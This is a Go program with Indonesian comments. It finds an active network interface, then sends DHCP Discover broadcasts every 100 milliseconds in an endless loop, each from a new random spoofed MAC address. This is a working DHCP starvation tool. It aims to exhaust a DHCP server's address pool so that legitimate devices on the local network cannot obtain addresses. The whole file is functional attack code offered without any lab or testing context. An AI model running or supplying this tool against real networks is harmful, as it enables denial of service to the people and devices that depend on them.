package main

import (
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// generateRandomMAC menghasilkan sebuah MAC address acak yang valid.
func generateRandomMAC() (net.HardwareAddr, error) {
	buf := make([]byte, 6)
	_, err := rand.Read(buf)
	if err != nil {
		return nil, err
	}
	// Set bit U/L (Locally Administered) ke 1 dan bit Multicast ke 0
	buf[0] = (buf[0] & 0xFE) | 0x02
	return net.HardwareAddr(buf), nil
}

// findActiveInterface adalah fungsi yang lebih robust untuk menemukan interface.
// Ini menggabungkan pcap dan library standar net untuk kompatibilitas lebih baik.
func findActiveInterface() (string, net.HardwareAddr, error) {
	// 1. Dapatkan daftar semua device dari pcap
	pcapDevices, err := pcap.FindAllDevs()
	if err != nil {
		return "", nil, fmt.Errorf("gagal mencari device pcap: %w", err)
	}

	// 2. Cari device pcap yang memiliki alamat IPv4
	for _, pcapDevice := range pcapDevices {
		for _, addr := range pcapDevice.Addresses {
			if addr.IP.To4() != nil {
				// 3. Jika ditemukan, gunakan library standar 'net' untuk mendapatkan detail lengkap
				// termasuk MAC address yang lebih andal.
				// Kita cari interface di library 'net' yang namanya cocok dengan deskripsi pcapDevice.
				// Ini karena nama di pcap (seperti \Device\NPF_{...}) berbeda dengan nama di 'net' (seperti "Ethernet").
				netInterfaces, err := net.Interfaces()
				if err != nil {
					continue // Lewati jika tidak bisa membaca interface net
				}

				for _, netIface := range netInterfaces {
					// Cocokkan berdasarkan alamat IP untuk memastikan kita dapat interface yang benar
					addrs, err := netIface.Addrs()
					if err != nil {
						continue
					}
					for _, a := range addrs {
						if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
							if ipnet.IP.To4().Equal(addr.IP.To4()) {
								fmt.Printf("Interface ditemukan: %s\n", pcapDevice.Name)
								fmt.Printf("  Deskripsi: %s\n", pcapDevice.Description)
								fmt.Printf("  IP Address: %s\n", addr.IP)
								fmt.Printf("  MAC Address: %s\n", netIface.HardwareAddr)
								// Kembalikan nama device pcap dan MAC address dari library 'net'
								return pcapDevice.Name, netIface.HardwareAddr, nil
							}
						}
					}
				}
			}
		}
	}

	return "", nil, errors.New("tidak ada interface jaringan aktif yang cocok ditemukan")
}

func main() {
	ifName, _, err := findActiveInterface() // srcMAC tidak digunakan, gunakan '_'
	if err != nil {
		log.Fatalf("Gagal menemukan interface: %v", err)
	}

	handle, err := pcap.OpenLive(ifName, 65536, false, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Gagal membuka handle untuk %s: %v", ifName, err)
	}
	defer handle.Close()

	fmt.Println("\nMemulai pengiriman DHCP Discover... Tekan Ctrl+C untuk berhenti.")

	requestCount := 0
	for {
		requestCount++
		clientMAC, err := generateRandomMAC()
		if err != nil {
			log.Printf("Gagal membuat MAC: %v", err)
			continue
		}

		fmt.Printf("[%d] Mengirim DHCP Discover dari MAC: %s\n", requestCount, clientMAC)

		// --- Layer Pembangun Paket ---
		ethLayer := &layers.Ethernet{
			SrcMAC:       clientMAC,
			DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
			EthernetType: layers.EthernetTypeIPv4,
		}

		ipLayer := &layers.IPv4{
			SrcIP:    net.IPv4(0, 0, 0, 0),
			DstIP:    net.IPv4(255, 255, 255, 255),
			Protocol: layers.IPProtocolUDP,
		}

		udpLayer := &layers.UDP{
			SrcPort: 68,
			DstPort: 67,
		}
		udpLayer.SetNetworkLayerForChecksum(ipLayer)

		// Buat Xid acak
		xidBytes := make([]byte, 4)
		rand.Read(xidBytes)
		xid := binary.BigEndian.Uint32(xidBytes)

		dhcpLayer := &layers.DHCPv4{
			Operation:    layers.DHCPOpRequest,
			HardwareType: layers.LinkTypeEthernet,
			ClientHWAddr: clientMAC,
			Xid:          xid,
		}

		// Tambahkan opsi-opsi DHCP
		dhcpLayer.Options = append(dhcpLayer.Options, layers.DHCPOption{
			Type: layers.DHCPOptMessageType,
			Data: []byte{byte(layers.DHCPMsgTypeDiscover)},
		})
		dhcpLayer.Options = append(dhcpLayer.Options, layers.DHCPOption{
			// PERBAIKAN PENTING: Gunakan nilai numerik 55 untuk kompatibilitas maksimal.
			// Option 55 adalah "Parameter Request List" menurut standar RFC 2132.
			Type: 55,
			Data: []byte{
				byte(layers.DHCPOptSubnetMask),
				byte(layers.DHCPOptRouter),
				byte(layers.DHCPOptDNS),
			},
		})
		dhcpLayer.Options = append(dhcpLayer.Options, layers.DHCPOption{
			Type: layers.DHCPOptEnd,
		})

		// --- Serialisasi dan Pengiriman ---
		buf := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}

		if err := gopacket.SerializeLayers(buf, opts, ethLayer, ipLayer, udpLayer, dhcpLayer); err != nil {
			log.Printf("Gagal membuat paket: %v", err)
			continue
		}

		if err := handle.WritePacketData(buf.Bytes()); err != nil {
			log.Printf("Gagal mengirim paket: %v", err)
		}

		time.Sleep(100 * time.Millisecond)
	}
}
